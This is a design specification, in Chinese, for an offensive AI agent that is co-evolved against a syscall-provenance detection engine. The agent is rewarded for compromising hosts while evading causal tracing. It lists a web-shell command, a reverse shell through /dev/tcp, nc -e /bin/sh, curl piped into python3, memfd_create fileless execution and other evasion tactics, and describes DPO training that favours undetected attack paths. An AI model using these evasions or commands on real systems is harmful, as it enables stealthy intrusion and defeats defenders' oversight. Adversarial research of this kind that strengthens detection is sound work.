# PenAgent 攻击端对抗协同进化设计方案
## Adversarial Co-Evolution Design: Offensive Engine Specification

---

## 1. 架构定位与博弈目标

### 1.1 系统定位
本方案定义 **PenAgent（进攻性自主智能体）** 与 **TraceSage（基于系统调用图的威胁溯源引擎）** 之间的对抗协同进化（Adversarial Co-Evolution）机制。  
PenAgent 不再仅仅以“获取目标靶机最高特权（Root/Flag）”为单一收益，而是将**“对抗规避度（Evasion Rate）与因果溯源阻断（Causal Severance）”**纳入多目标优化目标函数。

### 1.2 对抗博弈收益函数 (Payoff Function)
在单轮攻防演练 $r$ 中，PenAgent 的综合适应度（Fitness）定义为：

$$R_{\text{PenAgent}}(r) = \mathbb{I}(\text{Compromise}) \cdot \Big[ 1 - \alpha \cdot \mathcal{S}_{\text{exposure}}(\mathcal{G}_{\text{prov}}, \tau) \Big] - \beta \cdot \text{Cost}(Tokens, Steps)$$

- $\mathbb{I}(\text{Compromise}) \in \{0, 1\}$：客观提权状态（通过 `uid=0`、Flag 强凭据判定）。
- $\mathcal{S}_{\text{exposure}} \in [0, 1]$：**TraceSage 溯源图暴露度**，由 TraceSage 在系统调用因果图 $\mathcal{G}_{\text{prov}}$ 中对攻击轨迹 $\tau$ 的成功还原率确定：
  $$\mathcal{S}_{\text{exposure}} = \frac{|\mathcal{E}_{\text{detected}} \cap \mathcal{E}_{\text{attack}}|}{|\mathcal{E}_{\text{attack}}|}$$
- $\alpha \in [0, 1]$：规避权重系数（默认 $0.6$）。
- $\beta$：资源损耗惩罚项。

---

## 2. 跨系统对抗接口协议 (Data Contract)

攻击端与溯源端通过结构化审计通道进行无缝对齐，交互生命周期如下：

```text
┌───────────────────────┐                                 ┌───────────────────────┐
│   PenAgent (攻击端)   │                                 │   TraceSage (溯源端)  │
└───────────┬───────────┘                                 └───────────┬───────────┘
            │                                                         │
            │ 1. 下发攻击指令并在受害机产生系统调用流                     │
            │ ──────────────────────────────────────────────────────> │
            │                                                         │
            │ 2. 导出纳秒级执行先验 (ExecutionAuditManifest)          │
            │ ──────────────────────────────────────────────────────> │
            │                                                         │
            │                                                         │ (构建因果图/多通道调查)
            │                                                         │
            │ 3. 反馈因果溯源审计判决 (ProvenanceAuditVerdict)         │
            │ <────────────────────────────────────────────────────── │
            │                                                         │
┌───────────┴───────────┐                                             │
│ 4. 触发 Evolver 节点  │                                             │
│ · 归因分析器          │                                             │
│ · 战术突变引擎        │                                             │
│ · LightRAG 规避图自增 │                                             │
└───────────────────────┘                                 ┌───────────┴───────────┐
                                                          │ 5. 自动合成真值并蒸馏 │
                                                          └───────────────────────┘
```

### 2.1 攻击执行先验格式 (`ExecutionAuditManifest`)
PenAgent 每次完成任务阶段后，向共享存储导出执行凭据清单，供 TraceSage 对齐：

```json
{
  "engagement_id": "eng-20261025-001",
  "target_host": "100.84.151.2",
  "attack_host": "100.74.213.15",
  "actions": [
    {
      "step_id": "step-01",
      "phase": "exploiter",
      "command": "curl http://100.84.151.2/shell.php?c=id",
      "start_ns": 1729845600123456789,
      "end_ns": 1729845600987654321,
      "expected_artifacts": {
        "network_flow": "100.74.213.15:* -> 100.84.151.2:80",
        "spawned_process": ["sh", "id"],
        "written_files": []
      }
    }
  ]
}
```

### 2.2 溯源审计判决格式 (`ProvenanceAuditVerdict`)
TraceSage 返回的溯源诊断报告：

```json
{
  "verdict_id": "vrd-20261025-001",
  "is_detected": true,
  "confidence": 0.94,
  "entry_point": "100.74.213.15:45234 -> 100.84.151.2:80",
  "compromised_pids": [10452, 10453],
  "exposed_causal_chains": [
    {
      "motif_id": "motif-2hop-012",
      "chain": "(Network:80) -> (Process:apache2) -[execve]-> (Process:sh) -[execve]-> (Process:id)"
    }
  ],
  "burned_rules": [
    "RULE-DISTILL-041: INBOUND_SERVER_PROC execve INTERPRETER"
  ]
}
```

---

## 3. 攻击端自适应战术突变引擎 (Evasion Mutation Engine)

PenAgent 内部引入独立的 `Evolver` 状态机节点，针对 TraceSage 的因果暴露证据执行**三级规避突变**：

### 3.1 暴露归因分析器 (`ExposureAttributor`)
对 `ProvenanceAuditVerdict` 中的 `exposed_causal_chains` 进行拓扑特征匹配，分类出薄弱点：
- **类别 A（进程血缘树暴露，Process Lineage Exposure）**：入站网络进程直接衍生终端解释器（如 `apache2 -> bash`）；
- **类别 B（文件实体持久化暴露，File Dropping Exposure）**：在受害机文件系统写入临时脚本（`ProcessToFile: create /tmp/exp.sh`）；
- **类别 C（敏感命令特征暴露，Command Signature Exposure）**：直接调用被审计探针捕获的高频敏感命令（如 `cat /etc/shadow`、`whoami`）。

### 3.2 战术规避突变映射规则 (Mutation Strategies)

```text
┌───────────────────────────┬───────────────────────────┬───────────────────────────────────────────────────────┐
│ 归因暴露类型              │ 传统暴露写法              │ 进化规避战术 (Evasion Mutation)                       │
├───────────────────────────┼───────────────────────────┼───────────────────────────────────────────────────────┤
│ 进程树父子直接派生暴露    │ apache2 -> execve -> bash │ 1. 双重 fork (Daemonize) 脱离会话组，使 PPID=1        │
│                           │                           │ 2. 写入已存在定时任务 (Cron/Timer) 异步执行，打断血缘 │
├───────────────────────────┼───────────────────────────┼───────────────────────────────────────────────────────┤
│ 文件系统落地 (I/O) 暴露   │ curl -o /tmp/a.elf &&     │ 1. 内存文件映射执行 (Linux memfd_create)              │
│                           │ chmod +x && ./a.elf       │ 2. 纯管道流式解释执行: curl ... | python3 -          │
├───────────────────────────┼───────────────────────────┼───────────────────────────────────────────────────────┤
│ 敏感工具特征字暴露        │ /bin/bash -i >& /dev/tcp  │ 离地攻击 (Living off the Land):                       │
│                           │ nc -e /bin/sh ...         │ 利用 awk/perl/openssl/find-exec/gdb 构造网络交互通道   │
└───────────────────────────┴───────────────────────────┴───────────────────────────────────────────────────────┘
```

---

## 4. LightRAG 对抗规避知识图谱动态增殖

传统 RAG 仅包含静态脆弱性知识（CVE -> PoC）。本架构将 LightRAG 扩展为**“攻防博弈双层动态图谱”**。

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   LightRAG 动态对抗图谱拓扑架构                        │
│                                                                        │
│   [Vulnerability: CVE-2021-41773]                                      │
│                 │                                                      │
│                 ├──(Has_Standard_PoC)──> [Payload: /bin/sh popen]      │
│                 │                                   │                  │
│                 │                         (Detected_By_TraceSage)      │
│                 │                                   ▼                  │
│                 │                          [Rule: Sysdig-Motif-041]    │
│                 │                                   │                  │
│                 │                           (Derived_Bypass)           │
│                 │                                   ▼                  │
│                 └──(Has_Evasive_PoC)───> [Payload: memfd_create inject]│
└────────────────────────────────────────────────────────────────────────┘
```

### 4.1 实体与关系类型扩展
在 LightRAG 中引入对抗元数据实体：
- **实体（Entity）**：
  - `DetectionRule`：由 TraceSage 蒸馏反馈生成的规则 ID 及因果子图签名；
  - `EvasionTechnique`：具体规避实现手段（如 `Technique-Memfd-Inject`）。
- **关系（Relation）**：
  - `(Standard_Payload) -[DETECTED_BY]-> (DetectionRule)`
  - `(DetectionRule) -[COUNTERED_BY]-> (EvasionTechnique)`
  - `(EvasionTechnique) -[MUTATES_TO]-> (Evasive_Payload)`

### 4.2 检索生成阶段的动态惩罚机制
在 `planner_node` 与 `task_nodes.gen` 调用 LightRAG 时：
- 当提取出的漏洞利用路径被标记为 `DETECTED_BY` 当前目标已知的 TraceSage 规则集时，该节点权重置为 $0$；
- 系统沿 `COUNTERED_BY` 边自动检索替代免杀突变方案，使大模型规划出的 Payload 天然具备免杀防御特征。

---

## 5. 偏好对数据集（Preference Dataset）与策略沉淀

多轮攻防博弈中自动产生高价值偏好对，格式符合 DPO（Direct Preference Optimization）与 In-Context Few-Shot 标准：

$$\mathcal{D}_{\text{pair}} = \left\{ \left( x_{\text{context}}, y_{\text{chosen}}, y_{\text{rejected}} \right) \right\}$$

- **上下文 $x$**：目标服务环境与任务目标（如 Apache 2.4.41 RCE）。
- **优质动作 $y_{\text{chosen}}$**：成功拿下权限，且未在 TraceSage 溯源图中被标记为恶意边的隐蔽调用轨迹。
- **劣质动作 $y_{\text{rejected}}$**：成功拿下权限，但在 TraceSage 溯源图中留下了完整 2-hop 基模、被规则毫秒级确诊的粗暴攻击轨迹。

此数据池自动追加至 `agent/data/adversarial_memory/`，作为后续规划器的动态 Few-Shot 示例库。

---

## 6. LangGraph 节点挂载与工程集成方案

在 [`agent/graphs.py`](file:///C:/Users/Favor/Desktop/PenAgent/agent/graphs.py) 的顶层 Engagement Graph 中，挂载全新的 `evolver` 阶段节点：

```text
START ──> scope ──> collector ──> scanner ──> exploiter ──> reporter ──> evolver ──> END
                                                                            │
                                                                            ▼
                                                             [写回 LightRAG 规避图谱]
                                                             [导出 DPO 偏好对数据]
```

### 6.1 `evolver_node` 实现逻辑伪代码
```python
def evolver_node(state: EngagementState) -> Dict[str, Any]:
    # 1. 导出本轮 PenAgent 的纳秒级审计清单
    manifest_path = export_execution_manifest(state)
    
    # 2. 读取 TraceSage 返回的溯源裁决报告 (或调用 TraceSage 评测 API)
    verdict = load_tracesage_verdict(state.get("thread_id"))
    
    # 3. 归因分析
    exposure_summary = analyze_exposure(verdict, state.get("action_history"))
    
    # 4. 驱动 LightRAG 增殖更新
    if exposure_summary.has_burned_rules:
        lightrag_client.insert_anti_patterns(
            rules=exposure_summary.burned_rules,
            bypasses=generate_bypasses(exposure_summary)
        )
        
    # 5. 沉淀偏好数据对
    record_dpo_trajectory(state, verdict)
    
    return {"phase": "evolved", "phase_outcome": "success"}
```
